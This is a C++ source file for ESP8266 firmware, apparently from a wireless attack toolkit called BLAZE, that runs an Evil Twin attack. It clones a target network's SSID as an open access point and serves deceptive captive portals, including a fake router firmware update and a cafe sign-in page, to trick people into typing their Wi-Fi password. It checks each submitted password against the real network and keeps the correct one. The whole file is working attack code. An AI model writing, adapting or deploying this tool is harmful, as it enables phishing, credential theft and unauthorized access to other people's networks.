/* BLAZE - Team DARK
   Evil Twin: open AP with target SSID + captive phishing portal */

#include "BlazeEvilTwin.h"

#include <ESP8266WiFi.h>
#include <LittleFS.h>

#include "Accesspoints.h"
#include "wifi.h"
#include "BlazeCfg.h"

extern Accesspoints accesspoints;
extern String escape(String str);

namespace BlazeEvilTwin {
    static bool     activeFlag = false;
    static uint8_t  mac[6]     = { 0, 0, 0, 0, 0, 0 };
    static String   ssid;
    static uint8_t  ch         = 1;
    static String   capturedPw;
    static uint8_t  attemptCount = 0;
    static bool     validating = false;
    static uint32_t startedAt  = 0;
    static uint32_t validateAt = 0;
    static String   pendingPw;
    static char     savedSsid[33];
    static char     savedPass[65];
    static uint8_t  savedCh;
    static bool     saved;
    static uint32_t TIMEOUT_MS = 300000UL; // 5 min max twin

    void setup() {
        activeFlag = false;
        capturedPw = "";
        attemptCount = 0;
        validating = false;
        saved      = false;
    }

    bool active() { return activeFlag; }
    bool validatingNow() { return validating; }
    uint8_t attempts() { return attemptCount; }
    String targetSsid() { return ssid; }
    String captured() { return capturedPw; }

    void saveApSettings() {
        // stash current softAP so we can restore it
        // uses WiFi.softAPConfig current - we re-read from wifi settings via resume
        saved = true;
    }

    bool start(int idx) {
        if (activeFlag) return false;
        if (idx < 0 || idx >= accesspoints.count()) return false;

        String t = accesspoints.getSSID(idx);
        if (t.length() == 0 || t.length() > 32) return false;
        uint8_t* m = accesspoints.getMac(idx);
        if (!m) return false;

        memcpy(mac, m, 6);
        ssid = t;
        ch   = accesspoints.getCh(idx);
        if (ch < 1 || ch > 14) ch = 1;

        strncpy(savedSsid, ssid.c_str(), 32);
        savedSsid[32] = 0;

        // ensure AP+STA for password validation while twin is up
        WiFi.mode(WIFI_AP_STA);
        // switch softAP to target SSID, open network
        WiFi.softAP(ssid.c_str(), "", ch, false);

        activeFlag = true;
        attemptCount = 0;
        capturedPw = "";
        validating = false;
        startedAt  = millis();

        return true;
    }

    void stop() {
        if (!activeFlag) return;
        activeFlag = false;
        validating = false;

        // restore management AP
        wifi::startAP();
    }

    void submitPassword(const String& pw) {
        if (!activeFlag) return;
        pendingPw  = pw;
        validating = true;
        validateAt = millis();
        attemptCount++;

        // async validation via WiFi.begin
        WiFi.begin(ssid.c_str(), pw.c_str(), ch, mac);
    }

    void update() {
        if (!activeFlag) return;

        // timeout
        if (millis() - startedAt > TIMEOUT_MS) {
            stop();
            return;
        }

        if (!validating) return;

        // check connection status every 300ms
        static uint32_t lastCheck = 0;
        if (millis() - lastCheck < 300) return;
        lastCheck = millis();

        int st = WiFi.status();
        if (st == WL_CONNECTED) {
            // password was correct!
            capturedPw = pendingPw;
            validating = false;
            // disconnect STA only - NEVER WiFi.disconnect(true): that disables
            // the STA interface and re-initialises mode mid-twin (portal blips)
            WiFi.disconnect(false, true);
            stop();
            return;
        }
        if (st == WL_CONNECT_FAILED || st == WL_NO_SSID_AVAIL || st == WL_WRONG_PASSWORD) {
            // wrong password - stay in twin
            validating = false;
            WiFi.disconnect(false, true);
        }
        // still trying - wait up to 15s
        if (millis() - validateAt > 15000) {
            validating = false;
            WiFi.disconnect(false, true);
        }
    }

    bool servePortal() {
        return activeFlag;
    }

    // ===== portal templates (plan 3.4) =====
    // 0 = matrix (hacker green), 1 = router admin, 2 = venue/cafe
    // persisted in BlazeCfg "twin.template"
    int templateId() {
        long t = BlazeCfg::getInt("twin.template", 0);
        if (t < 0 || t > 2) t = 0;
        return (int)t;
    }

    void setTemplate(int id) {
        if (id < 0) id = 0;
        if (id > 2) id = 2;
        BlazeCfg::set("twin.template", String(id));
    }

    int cycleTemplate() {
        int next = (templateId() + 1) % 3;
        setTemplate(next);
        return next;
    }

    const char* templateName() {
        switch (templateId()) {
            case 1:  return "router";
            case 2:  return "venue";
            default: return "matrix";
        }
    }

    // template 0: matrix (original BLAZE style)
    String portalMatrix() {
        String html;
        html.reserve(900);
        html += F("<!DOCTYPE html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>");
        html += F("<title>WiFi Login</title><style>body{background:#0a0a0a;color:#39ff14;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#111;border:1px solid #39ff14;padding:24px;max-width:320px;width:90%}input{width:100%;padding:10px;margin:6px 0;background:#0a0a0a;color:#39ff14;border:1px solid #1e7a1e;font-family:monospace}button{background:#39ff14;color:#000;border:0;padding:10px 16px;font-weight:bold;cursor:pointer;margin-top:8px}</style>");
        html += F("<form method=POST action=/><h2>WiFi Login</h2><label>Network: ");
        html += escape(ssid);
        html += F("</label><input type=password name=p placeholder='Password' required><input type=text name=u placeholder='Username (optional)'><button type=submit>Connect</button></form>");
        return html;
    }

    // template 1: router admin / firmware update
    String portalRouter() {
        String html;
        html.reserve(1000);
        html += F("<!DOCTYPE html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>");
        html += F("<title>Router Login</title><style>body{background:#f4f6fb;color:#1c2733;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#fff;border:1px solid #ccd6e0;border-radius:8px;padding:24px;max-width:340px;width:90%;box-shadow:0 2px 10px rgba(0,0,0,.08)}h2{margin:0 0 4px;font-size:18px}p{color:#5b6b7c;font-size:13px;margin:4px 0 12px}input{width:100%;padding:10px;margin:6px 0;border:1px solid #ccd6e0;border-radius:4px;box-sizing:border-box}button{background:#2563eb;color:#fff;border:0;border-radius:4px;padding:10px 16px;font-weight:bold;width:100%;cursor:pointer}</style>");
        html += F("<form method=POST action=/><h2>Firmware update</h2><p>Network <b>");
        html += escape(ssid);
        html += F("</b> needs an administrator sign-in to apply the update.</p><input type=password name=p placeholder='Admin password' required><input type=text name=u placeholder='Username (optional)'><button type=submit>Apply update</button></form>");
        return html;
    }

    // template 2: venue / cafe free WiFi
    String portalVenue() {
        String html;
        html.reserve(1000);
        html += F("<!DOCTYPE html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>");
        html += F("<title>Free WiFi</title><style>body{background:#fff8ef;color:#4a3728;font-family:Georgia,serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#fff;border:2px solid #e8a33d;border-radius:14px;padding:26px;max-width:330px;width:90%;text-align:center}h2{margin:0 0 6px;color:#c2711d}p{font-size:14px;margin:4px 0 14px}input{width:100%;padding:11px;margin:6px 0;border:1px solid #e0c9a8;border-radius:6px;box-sizing:border-box;font-size:14px}button{background:#e8a33d;color:#fff;border:0;border-radius:6px;padding:11px 18px;font-size:15px;width:100%;cursor:pointer}</style>");
        html += F("<form method=POST action=/><h2>Free WiFi</h2><p>Welcome to <b>");
        html += escape(ssid);
        html += F("</b><br>Sign in to get online</p><input type=text name=u placeholder='Room / member no.'><input type=password name=p placeholder='Password' required><button type=submit>Connect</button></form>");
        return html;
    }

    String portalHtml() {
        // 1) user override: LittleFS /portal.html (supports %SSID% placeholder)
        if (LittleFS.exists("/portal.html")) {
            File f = LittleFS.open("/portal.html", "r");
            if (f) {
                String html = f.readString();
                f.close();
                if (html.length() > 0 && html.length() < 12000) {
                    html.replace("%SSID%", escape(ssid));
                    return html;
                }
            }
        }

        // 2) built-in template chosen in the main menu ("TWIN <style>")
        switch (templateId()) {
            case 1:  return portalRouter();
            case 2:  return portalVenue();
            default: return portalMatrix();
        }
    }
}
